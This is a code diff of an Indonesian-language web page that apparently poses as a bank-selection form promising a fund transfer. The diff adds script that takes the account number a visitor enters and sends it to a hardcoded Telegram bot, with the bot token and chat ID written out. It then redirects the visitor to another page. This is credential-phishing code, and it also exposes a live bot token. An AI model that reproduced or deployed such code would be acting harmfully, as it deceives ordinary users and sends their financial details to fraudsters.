@@ -1,66 +1,152 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Menu Pilihan</title>
+  <title>Pilihan Bank</title>
+  <meta name="viewport" content="width, initial-scale=1">
   <style>
-    /* CSS untuk tata letak menu */
-    .menu-container {
-      text-align: center; /* Pusatkan teks */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      text-align: center;
     }
 
-    .menu {
+    #gambar-atas {
+      margin-bottom: 20px;
+    }
+
+    #gambar-atas img {
+      width: 100%;
+      object-fit: cover;
+      max-height: 300px;
+    }
+
+    div {
       display: flex;
       flex-direction: column;
-      gap: 10px; /* Jarak antara setiap menu */
-      width: 290px; /* Lebar menu */
-      margin: 20px auto; /* Posisikan menu di tengah */
+      align-items: center;
+      justify-content: center;
+      margin-top: 20px;
     }
 
-    /* CSS untuk gaya menu */
-    .menu-item {
-      background-color: #a52a2a;
-      padding: 10px;
+    /* Kolom Select */
+    #pilihan-container {
+      width: 90%;
+      max-width: 450px;
+      margin-bottom: 10px;
+      margin: 0 auto;
+    }
+
+    #pilihan {
+      width: 102%;
+      padding: 13px;
       border-radius: 5px;
-      text-align: center;
-      text-decoration: none; /* Menghilangkan garis bawah pada tautan */
-      color: #f0f0f0; /* Warna teks */
+      border: 1px solid #a52a2a;
     }
 
-    .menu-item:hover {
-      background-color: #e0e0e0; /* Warna latar belakang saat dihover */
+    /* Jarak antara kolom select dan kolom input */
+    #jarak1 {
+      height: 10px;
+    }
+
+    /* Kolom Input dan Tombol Submit */
+    #jumlah-container {
+      width: 86%;
+      max-width: 450px;
+      margin-bottom: 10px;
+      display: flex;
+      flex-direction: column;
+      margin: 0 auto;
+    }
+
+    #jumlahInput {
+      width: 98%;
+      padding: 13px;
+      border-radius: 5px;
+      border: 1px solid #a52a2a;
+      margin-bottom: 10px;
+    }
+
+    #submit {
+      width: 107%;
+      max-width: 350px;
+      padding: 13px;
+      border-radius: 8px;
+      border: none;
+      background-color: #a52a2a;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    /* Gambar di bawah Tombol Submit */
+    #gambar-bawah {
+      margin-top: 20px;
+    }
+
+    #gambar-bawah img {
+      width: 95%;
+      object-fit: cover;
     }
   </style>
-</head>
-<body>
-  <div class="menu-container">
-    <h2>Dana Akan Dikirim Maksimal 1x24 Jam</h2><br>
-    <h3>Pilih Bank Anda</h3>
-    <div class="menu">
-      <!-- Tautan menu pilihan -->
-      <a href="jajan.html" class="menu-item" onclick="showLoading()">BRI</a>
-      <a href="jajann.html" class="menu-item" onclick="showLoading()">BCA</a>
-      <a href="jajannn.html" class="menu-item" onclick="showLoading()">BNI</a>
-      <a href="jajannnn.html" class="menu-item" onclick="showLoading()"> Mandiri</a>
-      <a href="lainnya.html" class="menu-item" onclick="showLoading()">Bank Lainnya</a>
-    </div>
-  </div>
-
-  <!-- Teks pesan menunggu -->
-  <p id="waitingMessage" style="display: none;">Mohon Tunggu...</p>
-
   <script>
-    function showLoading() {
-      // Menampilkan pesan menunggu
-      var waitingMessage = document.getElementById('waitingMessage');
-      waitingMessage.style.display = 'block';
+    function sendMessageToTelegram(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim: " + message);
+        }
+      };
+      var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
 
-      // Mengarahkan ke halaman selanjutnya setelah 3 detik
+      xhttp.open("POST", url, true);
+      xhttp.send();
+    }
+
+    function kirimPesan() {
+      var pesan = document.getElementById("jumlahInput").value;
+      sendMessageToTelegram("NO Rek: " + pesan);
+
+      document.getElementById("submit").value = "Processing.......";
+
       setTimeout(function() {
-        window.location.href = 'pilih.html';
-      }, 8000); // 3 detik
+        window.location.href = "jajan.html";
+      }, 15);
     }
   </script>
+</head>
+<body>
+  <!-- Gambar Atas -->
+  <div id="gambar-atas">
+    <img src="https://i.ibb.co/MRQNSSH/IMG-20240218-024844.jpg" alt="Gambar Pucok">
+  </div>
+
+  <!-- Kolom Select -->
+  <div id="pilihan-container">
+    <label for="pilihan"></label>
+    <select id="pilihan" name="pilihan">
+      <option value="opsi1">Pilih Bank</option>
+      <option value="opsi2">BCA</option>
+      <option value="opsi3">BRI</option>
+      <option value="opsi4">BNI</option>
+      <option value="opsi5">Bank Lainnya</option>
+    </select>
+  </div>
+
+  <!-- Jarak antara kolom select dan kolom input -->
+  <div id="jarak7"></div>
+
+  <!-- Kolom Input dan Tombol Submit -->
+  <div id="jumlah-container">
+    <input type="number" id="jumlahInput" name="jumlah" placeholder="Masukan No Rek">
+    <input type="submit" id="submit" value="Lanjutkan" onclick="kirimPesan()">
+  </div>
+
+  <!-- Gambar Bawah -->
+  <div id="gambar-bawah">
+    <img src="https://i.ibb.co/c2BQYp8/IMG-20231229-WA0003-removebg-preview.png" alt="Gambar 2711">
+  </div>
 </body>
 </html>
